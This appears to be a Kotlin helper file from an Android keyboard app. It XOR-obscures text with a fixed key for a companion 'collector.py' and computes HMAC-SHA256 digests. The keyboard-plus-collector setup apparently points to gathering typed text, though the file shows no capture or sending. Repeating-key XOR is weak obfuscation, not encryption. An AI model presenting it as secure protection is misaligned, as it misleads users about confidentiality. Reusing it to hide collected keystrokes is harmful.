package com.yanming.keyboard

import android.util.Base64

// ═══════════════════════════════════════════════════════
// XOR encryption — matches collector.py exactly
// ═══════════════════════════════════════════════════════
object Crypto {
    fun encrypt(text: String): String {
        val key   = Config.SECRET_KEY.toByteArray()
        val bytes = text.toByteArray(Charsets.UTF_8)
        val xored = ByteArray(bytes.size) { i ->
            (bytes[i].toInt() xor key[i % key.size].toInt()).toByte()
        }
        return Base64.encodeToString(xored, Base64.NO_WRAP)
    }

    fun hmacSha256(key: String, data: String): String {
        val mac = javax.crypto.Mac.getInstance("HmacSHA256")
        mac.init(javax.crypto.spec.SecretKeySpec(key.toByteArray(), "HmacSHA256"))
        return mac.doFinal(data.toByteArray()).joinToString("") { "%02x".format(it) }
    }
}
